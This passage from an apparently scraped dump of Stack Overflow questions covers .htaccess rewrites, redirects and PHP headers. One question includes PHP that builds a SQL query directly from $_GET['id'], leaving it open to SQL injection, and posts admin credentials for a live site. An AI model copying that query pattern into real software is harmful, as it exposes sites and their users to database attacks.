something?</p>\n"},{"tags":["php","apache",".htaccess","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13181931,"title":"Using htaccess to protect files","body":"<p>I am using htaccess to protect uploaded files from being available publicly (only logged in users can see the files).</p>\n\n<p>My current htaccess consists of:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*).(pdf|exe|doc|jpg|jpeg|png|gif)$ access.php?file=$1.$2 [L]\n</code></pre>\n\n<p>This works, however my folder structure is as following:</p>\n\n<pre><code>access.php\n--------------files\n---------------------file\n---------------------photo\n</code></pre>\n\n<p>So, in the same dir as access.php is a subdir called 'files', and in files are 2 subdirs file and photo.</p>\n\n<p>How can I capture a more complete path of the file in the htaccess?\nExample: files/file/a.jpg\nNow it only returns a.jpg</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13174046,"title":"Htaccess==> domain.com/folder/index.php?ref=001 to domain.com/?ref=001","body":"<p>I'm trying to do this in htaccess:</p>\n\n<blockquote>\n  <p>domain.com/folder/index.php?ref=001 to domain.com/?ref=001</p>\n</blockquote>\n\n<p>Any help would be greatly appreciated.....</p>\n\n<p>Thanks!!!</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2515,"score":0,"question_id":2271075,"title":"is if else conditions available on htaccess?","body":"<p>I have a .htaccess file in the folder \"services\" in my website\nand have to give two urls following</p>\n\n<p>content of htaccess</p>\n\n<pre><code>#------------------------\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine on\n  RewriteRule ^(.*)$ index.php?n=$1 [L,QSA] \n&lt;/IfModule&gt;\n$-------------------------\n\n1. http://www.mysite.com/services/seo-work\n2. http://www.mysite.com/services/online-editor\n</code></pre>\n\n<p>The 1st URL rewritten using htaccess like <code>http://www.mysite.com/services/index.php?s=seo-work</code>\nThis is working correct. but when i am uploading other file online-editor.php on the same folder \"services\", it is not working</p>\n\n<p>so how the first url should show the page using index.php?s=seo-work if the page \"online-editor.php\" is not found in directory otherwise online-editor.php shoud show. I am programatically representing my problem below</p>\n\n<pre><code>if(IsFoundPageInDirectory(online-editor.php))\n{\n   GoToUrl(http://www.mysite.com/services/online-editor.php)\n}\nelse\n{\n   GoToUrl(http://www.mysite.com/services/index.php?s=seo-work)\n}\n</code></pre>\n\n<p>Please help me to get out of this problem\nAdvance thanks for your reply</p>\n"},{"tags":["php","apache",".htaccess","clean-urls"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13180230,"title":"URL rewrite through an entry.php","body":"<p>I have two directory under my application directory</p>\n\n<pre><code>my_app:\n  .htaccess\n  lib:\n    entry.php\n  web:\n    css:\n      css_file1\n      css_file2\n    js:\n      js_file1\n      js_file2\n</code></pre>\n\n<p>My url will be like this <a href=\"http://example.com/my_app/my_path\" rel=\"nofollow\">http://example.com/my_app/my_path</a></p>\n\n<p>Under the directory <strong>my_app</strong>, there are two directories <strong>web</strong> and <strong>lib</strong>.</p>\n\n<p>If the <strong>my_path</strong> can be map to any file under the <strong>web</strong> directory, use it.</p>\n\n<p>For example, <a href=\"http://example.com/my_app/css/css_file1\" rel=\"nofollow\">http://example.com/my_app/css/css_file1</a> should map to <strong>my_app/web/css/css_file1</strong>.</p>\n\n<p>Otherwise redirect it to <strong>lib/entry.php/my_path</strong> so that the the <strong>my_path</strong> can be accessed through <strong>$_SERVER['PATH_INFO']</strong> The redirection should be internal. The redirection should not be visible to user.</p>\n\n<p>I want to write configuration in <strong>.htaccess</strong> to accomplish it.\nI wrote the code as given below.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteRule (.*) ../web/$1  \n    RewriteCond web/%{REQUEST_FILENAME} !-f \n    RewriteCond web/%{REQUEST_FILENAME} !-d \n    RewriteRule (.*) lib/entry.php/$1 \n&lt;/IfModule&gt;\n</code></pre>\n\n<p>But I am getting 403 error.</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13180115,"title":"Multiple mod_rewrite rules","body":"<p>I have successfully created my mod_rewrite rule to change all dynamic URLs on the top level of the site, but now i need to create a rule for a second level, and i think later down the line i might need a second, second level of rewrites. </p>\n\n<p>At the moment i have this </p>\n\n<pre><code>    RewriteEngine on \n    RewriteCond %{SCRIPT_FILENAME} !-d\n    RewriteCond %{SCRIPT_FILENAME} !-f\n    RewriteRule ^(.+)$ index.php?subj=$1\n</code></pre>\n\n<p>And this helps to change /index.php?subj=home to /home as iut does for all other pages such as /contact /about /events and so on. </p>\n\n<p>But now I have created sub pages under events and therefore need to change /events.php?event=event-name to /event-name. But when i add another rule it messes up the whole site. What i tried to do is this </p>\n\n<pre><code>    RewriteEngine on \n    RewriteCond %{SCRIPT_FILENAME} !-d\n    RewriteCond %{SCRIPT_FILENAME} !-f\n    RewriteRule ^(.+)$ index.php?subj=$1\n    RewriteRule ^(.+)$ event.php?event=$1\n</code></pre>\n\n<p>But that didnt work. </p>\n\n<p>But on top of all that i want to redirect index.php and / (the root) to /home </p>\n\n<p>Could anyone please show me the correct rules as I have searched around but I just can't seem to get it right.</p>\n\n<p>Many thanks in advance :) </p>\n\n<p>Cheers</p>\n\n<p>UPDATE:\nThanks for all your help so far, ive tried everything but can't seem to get it right. As suggested by Ben I will give a bit more info on the URLs.\nRight now the entire site is sitting in a sub-directory as for now its still under development, so for now it is in mydomain.com/newwebsite/event.phpevent=2\nBut the .htaccess file currently in the root folder of the development site so it is in /newwebsite directory. \nSo the URL that i am trying to write would be mydomain.com/newwebsite/event/2</p>\n\n<p>You notice it says '2' and that is simply the page/event id. further down the line it will not be the id but rather its title.</p>\n"},{"tags":["php",".htaccess","magento"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13180306,"title":"301 Redirect Dynamic to static URL - Magento","body":"<p>For the life of me and all my years of experience with .htaccess I cannot get this simple redirect to work... I am totally stumped so any help would be great;</p>\n\n<p>From:\n<a href=\"http://www.offices-furniture.co.uk/pp?prod=fridgemaster-desk-fan.html\" rel=\"nofollow\">http://www.offices-furniture.co.uk/pp?prod=fridgemaster-desk-fan.html</a></p>\n\n<p>To:\n<a href=\"http://www.offices-furniture.co.uk/fridgemaster-desk-fan.html\" rel=\"nofollow\">http://www.offices-furniture.co.uk/fridgemaster-desk-fan.html</a></p>\n\n<p>Should be simple, but ohhh no..</p>\n\n<p>I'm using magento, own dedicated server so have full access to everything</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13053076,"title":"How to i change the rewrite rule to read images only","body":"<p>hi all i have this question as my rewrite rule is shown below. But everytime when i am using this code the js file wont work.</p>\n\n<pre><code>RewriteRule ^([^thumb].*\\.[jJ].*)$ /images/files/w.php?i=$1\n</code></pre>\n\n<p>Can anyone tell me where went wrong?</p>\n"},{"tags":["php",".htaccess","zend-framework"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":13170819,"title":"what is .htaccess file in php?","body":"<p>i am a beginner to zend frame work and  wannna know about <strong>.htaccess file and its uses</strong>.. \ncan somebody help me.. thanks in advance...... \nand i found some example like this...  </p>\n\n<p><strong>//example .htacess file</strong>  </p>\n\n<blockquote>\n  <p>AuthName \"Member's Area Name\"<br>\n      AuthUserFile /path/to/password/file/.htpasswd<br>\n      AuthType Basic<br>\n      require valid-user<br>\n      ErrorDocument 401 /error_pages/401.html<br>\n      AddHandler server-parsed .html  </p>\n</blockquote>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12957362,"title":"Apache HtAccess AddHandler Conditionnal on servername or ip","body":"<p>I'm hosting my staging and production servers at Site5, a relatively good hoster IMO. The question is not about their quality but more about an issue related to PHP's version.</p>\n\n<p>Our development server is using PHP 5.3 which is a good version, 5.4 being too new, we don't want to use it's features yet, not enough widespread.</p>\n\n<p>Problem is, Site5 uses PHP 5.2 by default but you can change to 5.3 using an HTACCESS AddHandler statement. Works fine on Site5 but our dev server crashes when we keep that statement in the HTAccess file.</p>\n\n<p>If you use SVN/Git to deploy your web apps, you know that you always keep the same files everywhere, so thats where it hurts, i can't seem to find anything about conditional statements for HTACCESS files for AddHandler. I can write conditions on the rewrite engine easily, but i can't find anything that would look and act like this:</p>\n\n<pre><code>#&lt;If SERVERNAME == \"targethost.com\"&gt;\n#    PHP 5.3 configuration for site5\n#    AddHandler application/x-httpd-php53 .php\n#&lt;/If&gt;\n</code></pre>\n\n<p>Anyone has a solution?</p>\n"},{"tags":[".htaccess","iirf"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":9,"score":1,"question_id":13177572,"title":"Converting .htaccess to IIRF","body":"<p>I'm trying to convert to IIRF, but it's just not working.\nThe IIRF documentation is not very helpful.</p>\n\n<p>Original code:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\nRewriteRule ^([a-zA-Z0-9_\\-\\/]+)$ ?g=$1 [L]\n</code></pre>\n\n<p>I tried adding slashes, but that doesn't seem to help.</p>\n"},{"tags":[".htaccess","zend-framework","rewrite","mod","apache2.2"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":23,"score":0,"question_id":13177855,"title":"Clicked link not going through .htaccess","body":"<p>We're trying to rewrite a URL to go to a different, external URL. So, in the .htaccess file we have </p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d [OR]\nRewriteCond %{REQUEST_URI} ^/favicon.ico$ \n\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^(.*)(\\/.*\\.com.*)  http://www$2 [R=301,L]\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>All internal links on the site work fine but if one of the links we want to rewrite to an external site is clicked, we get a 404 and the rewrite logs show the URL didn't even get processed through the .htaccess.</p>\n\n<p>No doubt it's trivial but after reading through the Apache mod_rewrite docs, we're no wiser!</p>\n\n<p>Thanks for any help</p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13153011,"title":"The page isn't redirecting properly , server is redirecting the request for this address in a way that will never complete","body":"<p>WHEN I TRY TO OPEN MY WEBSITE LOGIN PAGE IT IS SHOWING THE ERROR LIKE '\" the server is redirecting the request for this address in a way that will never complete\" ...I THINK THE PROBLEM MIGHT BE WITH THE .HTACCESS!.. PLEASE HELP ME WITH IT?\n<BR><BR><BR>\nHERE IS THE .HTACCESS:</p>\n\n<p>Turn on URL rewriting</p>\n\n<pre><code>RewriteEngine On\nInstallation directory &lt;BR&gt;\nRewriteBase /&lt;BR&gt;&lt;BR&gt;\nAllow any files or directories that exist to be displayed directly&lt;BR&gt;\nRewriteCond %{REQUEST_FILENAME} !-f &lt;BR&gt;\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewrite all other URLs to index.php/URL &lt;BR&gt;\nRewriteRule .*/ index.php/$0 [PT,L] \"\n</code></pre>\n\n<p>am not that sound in coding stuffs..could you pleas help me with it..btw i have successfully test this project on my system using wamp server...its an open source project for blood donor database please help me with it?.. am giving a link for all the related files for downloading...please download and check whats wrong with it..thanks in advance ....link:   <a href=\"http://www.uploadmb.com/dw.php?id=1351767344\" rel=\"nofollow\">http://www.uploadmb.com/dw.php?id=1351767344</a></p>\n"},{"tags":[".htaccess","mod-expires","response-headers","expires-header"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":142,"score":6,"question_id":12935560,"title":"PHP: header expires not working","body":"<p>My PHP code:</p>\n\n<pre><code>$expires_date = date('D, j F Y H:i:s', strtotime('now + 10 years')) . ' GMT';           \nheader(\"Expires: $expires_date\");\nheader('Content-type: text/javascript');\n\necho 'hello world';\n</code></pre>\n\n<p>When I check the response headers, I see this:</p>\n\n<p><code>Expires:Thu, 01 Jan 1970 00:00:00 GMT</code></p>\n\n<p>What am I doing wrong?</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>Was just experimenting, but it seems that I can't even unset Expires via <code>header_remove('Expires');</code>. I still see the 1970 date.</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>My response headers:</p>\n\n<pre><code>Cache-Control:private\nConnection:Keep-Alive\nContent-Encoding:gzip\nContent-Length:74\nContent-Type:text/javascript\nDate:Wed, 17 Oct 2012 22:40:45 GMT\nExpires:Thu, 01 Jan 1970 00:00:00 GMT\nKeep-Alive:timeout=5, max=98\nServer:Apache/2.2.21 (Win32) PHP/5.3.9\nVary:Accept-Encoding\nX-Powered-By:PHP/5.3.9\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","joomla","multi-language"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13173700,"title":"Htaccess, redirecting root paths to joomla instalation in subdirectory","body":"<p>I have a project directory with two sub directories (en and ar) containing two separate cms (Joomla) installations for two languages (Arabic and English). The cms directories have their own htaccess rules for SEO friendly urls. The English site is default and has existed for a while so i need the old URLs to still open. So <a href=\"http://www.mysite.com/path\" rel=\"nofollow\">http://www.mysite.com/path</a> should be a request for the same resource as <a href=\"http://www.mysite.com/en/path\" rel=\"nofollow\">http://www.mysite.com/en/path</a> for all possible values of path.</p>\n\n<p>What I have now is:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    SetEnv HTTP_MOD_REWRITE On\n    RewriteEngine on\n\n    RewriteCond %{REQUEST_URI} !^/en/\n    RewriteCond %{REQUEST_URI} !^/ar/\n    RewriteRule ^(.*)$ /en/$1\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>in the domains root folder. And in the subdirectories I have the latest joomlas default htaccess, I have only changed rewrite base. Here it is for reference (I have removed comments for brevity):</p>\n\n<pre><code>RewriteBase /en/\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\nRewriteCond %{REQUEST_URI} !^/index\\.php\nRewriteCond %{REQUEST_URI} /component/|(/[^.]*|\\.(php|html?|feed|pdf|vcf|raw))$ [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule .* index.php [L]\n</code></pre>\n\n<p>I thought this would work but the behavior is not optimal: h t t p : / / w w w . m y s i t e . c o m / redirects to h t t p : / / w w w . m y s i t e . c o m / e n and both installations work fine, as well as redirects to subdirectories of en that actually exist like the images and administrator folders. But redirects to sef urls don't work right. </p>\n\n<p>I am guessing this is an issue with Joomla and not .htaccess because it is redirecting to joomlas index.php but joomla is not recognizing the resource and giving a 404. I tried a phpinfo() in index.php but it wasn't very enlightening. </p>\n\n<p>Another bit of odd behavior that i don't understand is that when accessing the images or administrator directories the browsers location gets changed to include en but for the root directory (which works fine) and sub directories (that generate joomla errors) don't change the browser location. </p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4590,"score":1,"question_id":3414015,"title":"Redirect site with .htaccess but exclude one folder","body":"<p>I want to 301 redirect an entire website, but exclude everything in a folder called 'uploads' which exists in the root directory.\nI have googled for this, but didn't come up with anything, or I didn't think what I saw was right.</p>\n\n<p>Can we crack this?</p>\n"},{"tags":["php",".htaccess","magento"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":46,"score":0,"question_id":13160766,"title":"My .htaccess redirect is redirecting to wrong urls","body":"<p>I recently converted a wordpress webshop to a magento webshop. Now i want all the old urls that are indexed by the search engines redirect to the new ones from magento.\nSince it were only about 150 products i thought i'd do it manually.</p>\n\n<p>This is what i tried for all the products :</p>\n\n<pre><code>Redirect 301 /products-page/accu/unibat-ctz5s-bs/ http://www.domain.nl/accu-s/unibat-ctz5s-bs.html\n</code></pre>\n\n<p>It does try to redirect, but it ends up at this URL : <a href=\"http://www.domain.nl/accu-s.htmlunibat-ctz5s-bs/\" rel=\"nofollow\">http://www.domain.nl/accu-s.htmlunibat-ctz5s-bs/</a> , which gives a 404 :(</p>\n\n<p>Could anyone help me out here?</p>\n"},{"tags":[".htaccess","redirect","zend-route","dynamic-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13171014,"title":"htaccess redirect loop","body":"<p>Hey guys I'm getting a pretty nasty redirect loop since I'm using a bootstrap and need to figure out how to fix it. Just a heads up, but from forwarder.dev/direct-mail/{2 digit var}?CampId={7 digit var} I have a Zend Router forward this to somewhere else, this interim page does not exist. It is NOT possible to skip the htaccess hop though unfortunetly. </p>\n\n<pre><code>Options +FollowSymLinks\nOptions -Indexes\n\nRewriteEngine On\n\n# Move CampID's -&gt; directmail\nRewriteCond %{HTTP_HOST} ^(www\\.)?forwarder\\.dev [NC]\nRewriteCond %{REQUEST_URI} !^/direct-mail/\nRewriteCond %{QUERY_STRING} ^(?i:campid)=(\\w{2})(\\w{5})\nRewriteRule ^(.*)$ http://www.forwarder.dev/direct-mail/%1?CampId=%1%2 [R=301,L]\n\n\n# Bootstrap stuff for Zend\nRedirect 301 /index.php/ /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule !\\.(js|ico|gif|jpg|png|css) /index.php [L]\n</code></pre>\n\n<p>Error from LogLevel 15</p>\n\n<pre><code>[rid#b6ddb058/initial] (3) [perdir /var/www/forwarder.dev/] add path info postfix: /var/www/forwarder.dev/direct-mail -&gt; /var/www/forwarder.dev/direct-mail/HA\n[rid#b6ddb058/initial] (3) [perdir /var/www/forwarder.dev/] strip per-dir prefix: /var/www/forwarder.dev/direct-mail/HA -&gt; direct-mail/HA\n[rid#b6ddb058/initial] (3) [perdir /var/www/forwarder.dev/] applying pattern '^(.*)$' to uri 'direct-mail/HA'\n[rid#b6ddb058/initial] (4) [perdir /var/www/forwarder.dev/] RewriteCond: input='www.forwarder.dev' pattern='^(www\\.)?forwarder\\.dev' [NC] =&gt; matched\n[rid#b6ddb058/initial] (4) [perdir /var/www/forwarder.dev/] RewriteCond: input='/direct-mail/HA' pattern='!^/direct-mail/' =&gt; not-matched\n[rid#b6ddb058/initial] (3) [perdir /var/www/forwarder.dev/] add path info postfix: /var/www/forwarder.dev/direct-mail -&gt; /var/www/forwarder.dev/direct-mail/HA\n[rid#b6ddb058/initial] (3) [perdir /var/www/forwarder.dev/] strip per-dir prefix: /var/www/forwarder.dev/direct-mail/HA -&gt; direct-mail/HA\n[rid#b6ddb058/initial] (3) [perdir /var/www/forwarder.dev/] applying pattern '\\.(js|ico|gif|jpg|png|css)' to uri 'direct-mail/HA'\n[rid#b6ddb058/initial] (4) [perdir /var/www/forwarder.dev/] RewriteCond: input='/var/www/forwarder.dev/direct-mail' pattern='!-f' =&gt; matched\n[rid#b6ddb058/initial] (4) [perdir /var/www/forwarder.dev/] RewriteCond: input='/var/www/forwarder.dev/direct-mail' pattern='!-d' =&gt; matched\n[rid#b6ddb058/initial] (2) [perdir /var/www/forwarder.dev/] rewrite 'direct-mail/HA' -&gt; '/index.php'\n[rid#b6ddb058/initial] (1) [perdir /var/www/forwarder.dev/] internal redirect with /index.php [INTERNAL REDIRECT]\n[rid#b6dd2578/initial/redir#1] (3) [perdir /var/www/forwarder.dev/] strip per-dir prefix: /var/www/forwarder.dev/index.php -&gt; index.php\n[rid#b6dd2578/initial/redir#1] (3) [perdir /var/www/forwarder.dev/] applying pattern '^(.*)$' to uri 'index.php'\n[rid#b6dd2578/initial/redir#1] (4) [perdir /var/www/forwarder.dev/] RewriteCond: input='www.forwarder.dev' pattern='^(www\\.)?forwarder\\.dev' [NC] =&gt; matched\n[rid#b6dd2578/initial/redir#1] (4) [perdir /var/www/forwarder.dev/] RewriteCond: input='/index.php' pattern='!^/direct-mail/' =&gt; matched\n[rid#b6dd2578/initial/redir#1] (4) [perdir /var/www/forwarder.dev/] RewriteCond: input='CampId=HA12345' pattern='^(?i:campid)=(\\w{2})(\\w{5})' =&gt; matched\n[rid#b6dd2578/initial/redir#1] (2) [perdir /var/www/forwarder.dev/] rewrite 'index.php' -&gt; 'http://www.forwarder.dev/direct-mail/HA?CampId=HA12345'\n[rid#b6dd2578/initial/redir#1] (3) split uri=http://www.forwarder.dev/direct-mail/HA?CampId=HA12345 -&gt; uri=http://www.forwarder.dev/direct-mail/HA, args=CampId=HA12345\n[rid#b6dd2578/initial/redir#1] (2) [perdir /var/www/forwarder.dev/] explicitly forcing redirect with http://www.forwarder.dev/direct-mail/HA\n[rid#b6dd2578/initial/redir#1] (1) [perdir /var/www/forwarder.dev/] escaping http://www.forwarder.dev/direct-mail/HA for redirect\n[rid#b6dd2578/initial/redir#1] (1) [perdir /var/www/forwarder.dev/] redirect to http://www.forwarder.dev/direct-mail/HA?CampId=HA12345 [REDIRECT/301]\n</code></pre>\n"},{"tags":[".htaccess","joomla"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13160330,"title":"Htaccess redirect for hundreds URL","body":"<p>I have old site with hundreds URL that look like that: </p>\n\n<blockquote>\n  <p>http:www.domain.com/Contact.asp?Pid=344 </p>\n  \n  <p>http:www.domain.com/Contact.asp?Pid=345 </p>\n  \n  <p>http:www.domain.com/Contact.asp?Pid=346</p>\n</blockquote>\n\n<p>and so on ...</p>\n\n<p>I need to move all of them permanent to 1 single URL : </p>\n\n<blockquote>\n  <p>http:www.domain.com/contact</p>\n</blockquote>\n\n<p>I tried this: </p>\n\n<pre><code>RewriteCond %{QUERY_STRING} Contact.asp?Pid=([0-999]+) \n\nRewriteRule ^http://www.domain.com/contact? [L,R=301]\n</code></pre>\n\n<p>But it doesn't work well.</p>\n\n<p>The old site use <code>ASP</code>. The new site build on <code>Joomla</code>. The domain will be the domain from old site</p>\n"},{"tags":["c#",".htaccess","httpwebrequest","webrequest"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13169437,"title":"How do i login with WebRequest when protected with a .htacces password file","body":"<p>I want to login using the WebRequest class.</p>\n\n<p>var http = WebRequest.Create(\"http://www.xxx.nl/admin/xxx.php?id=3005\");</p>\n\n<p>I think you need to do something with the NetworkCredential Class but do i only need to fill in the username and password?</p>\n\n<p>Also i dont know how i can recieve the page data eventualy.\nIs there someone who knows it or has a good tutorial?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13170016,"title":".htaccess http to https","body":"<p>I am having a conflict between a couple of redirects causing issues.</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ https://www.%{HTTP_HOST}/$1 [R=301,L]\n\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /index\\.php\\ HTTP/\nRewriteRule ^index\\.php$ https://www.mywebsite.org/ [R=301,L]\n\nRewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI}\n\nOptions +FollowSymLinks -MultiViews\nRewriteCond %{REQUEST_FILENAME} !403\\.shtml\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.*) index.php?a_aid=$1  [NC,L,R=301]\n</code></pre>\n\n<p>The issue I am running into is that when someone enters a non secure url it forwards them to </p>\n\n<pre><code>http://www.mywebsite.org/index.php?a_aid=https://www.mywebsite.org/url\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13169057,"title":".htaccess file mod_rewrite clean url not working","body":"<p>So I want the usual thing from the .htaccess file. www.example.com/article.php?title=my_title should be replaced with www.example.com/article/my_title, however I cannot seem to get it to work. As of right now I can get the .php to drop and I suspect that might be some of the problem. (also I get <a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a> to go to <a href=\"http://www.example.com\" rel=\"nofollow\">http://www.example.com</a>) Here is my .htaccess file</p>\n\n<pre><code>Options +FollowSymLinks -MultiViews \nrewriteengine on\n\n## this is the piece that is not working\nRewriteRule ^title/(.*) article.php?arr=title/$1\n\nrewritecond %{HTTP_HOST} ^example.com$\nrewriterule ^example\\/(.*)$ \"http\\:\\/\\/www\\.example\\.com\\/$1\" [R=301]\n\nRewriteBase /\n\n## Hide .php extension\n# To externally redirect /dir/foo.php to /dir/foo\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s([^.]+)\\.php [NC]\nRewriteRule ^ %1 [R,L,NC]\n\n## To internally redirect /dir/foo to /dir/foo.php\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^ %{REQUEST_URI}.php [L]\n\n## Error document (needs to have a 404 page created)\nErrorDocument 404 http://www.example.com/\n</code></pre>\n"},{"tags":["php","mysql",".htaccess","seo","friendly"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":13169013,"title":"Blank page after SEO friendly URLs","body":"<p>I'm working on website <a href=\"http://www.party4you.sk/\" rel=\"nofollow\">http://www.party4you.sk/</a></p>\n\n<pre><code>Name: admin\nPassword: password\n</code></pre>\n\n<p>I made friendly urls via htaccess. /clubs/ instead of clubs.php works fine but for example /club/ekg-night-club/ instead of club.php?id=1 doesn't work. Can anybody help me please?</p>\n\n<p>So I want to make links: www.party4you.sk/club/the-name-of-the-club\nwithout ID in URL... Is it possible?</p>\n\n<p>Thank you</p>\n\n<p><em><strong></em>.htaccess**</strong></p>\n\n<pre><code>RewriteEngine on            \nRewriteCond %{HTTP_HOST} ^party4you.sk\nRewriteRule (.*) http://www.party4you.sk/$1 [R=301,L]\n\nRewriteRule ^$ index.php\nRewriteRule ^parties/$ parties.php\nRewriteRule ^clubs/?$ /clubs.php [L]\nRewriteRule ^photos/$ photos.php\nRewriteRule ^info/$ info.php\nRewriteRule ^contact/$ contact.php    \nRewriteRule ^club/(.*?)/?$ /club.php?id=$1 [L]\nRewriteRule clubs/(.*?)/?$ clubs.php?p=$1 [L]\n</code></pre>\n\n<p>*<strong><em>club.php</em>*</strong></p>\n\n<pre><code>&lt;?php \nrequire_once('dbconnect.php');\n$id = $_GET['id'];\n$result = mysql_query(\"SELECT * FROM clubs WHERE id='$id'\")\nor die(mysql_error()); \nwhile($club = mysql_fetch_assoc($result)) {\n?&gt;\n\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n&lt;head&gt; \n&lt;base href=\"http://www.party4you.sk\" /&gt;\n&lt;title&gt;&lt;?php echo $club[\"name\"]; ?&gt;&lt;/title&gt;\n</code></pre>\n"},{"tags":["email",".htaccess","configuration","php.ini","bluehost"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":375,"score":0,"question_id":6527975,"title":"Sendmail_from function in php.ini","body":"<p>I currently own a hosting package with <code>Bluehost.com</code>. All emails sent from any mail function end up sending in the  <code>username@boxname.bluehost.com</code>. I tried editing a <code>php.ini</code> file for this. It still didn't work. </p>\n\n<p>I am running WordPress. When new users are registered, they are emailed with this bluehost formatted email address.</p>\n\n<p>What exactly can I do?</p>\n"},{"tags":["php",".htaccess","url-rewriting","apache2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":44,"score":0,"question_id":13163908,"title":"url rewriting in php localhost with .htaccess not working","body":"<p>I want to rewrite url\nfrom</p>\n\n<pre><code>http://localhost/Ent/Movie/Info.php?year=2011&amp;movie=any_movie\n</code></pre>\n\n<p>to</p>\n\n<pre><code>http://localhost/Ent/Movie/Info/2011/any_movie\n</code></pre>\n\n<p>I have tried many code in .htaccess,like</p>\n\n<pre><code>Options +FollowSymLinks \nRewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteBase /Ent/Movie/\nRewriteRule ^Info/([0-9]+)/([a-zA-Z0-9]+)$ Info.php?year=$1&amp;movie=$2 [L]\n</code></pre>\n\n<p>here note that,my .htaccess file is in the root of website.</p>\n\n<p>is my .htaccess location wrong <strong>or</strong> code inside .htaccess?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13165966,"title":"URL-rewriting with index in a \"public\" folder","body":"<p>I’m a newcomer in the development world. I desperately try to get the good URL. I checked the site for similar problems but I can’t find exactly what I need. Or I do it badly.</p>\n\n<p>Here is the situation: I set up a project for a site whose the index.php file is in a folder named Public.</p>\n\n<p>To be clearer, here is the URL I have now to reach the homepage of the built site:\n<strong>http:// Domain Name.com/ Folder / Name of the site/public</strong></p>\n\n<p>My concern is about the folder Public: I don’t want it appears in the URL. \nHere is the URL I’d like to get:\n<strong>http:// Domain Name.com/ Folder / Name of the site</strong> </p>\n\n<p>In fact, I’d like this URL permits to get the index file placed in the folder 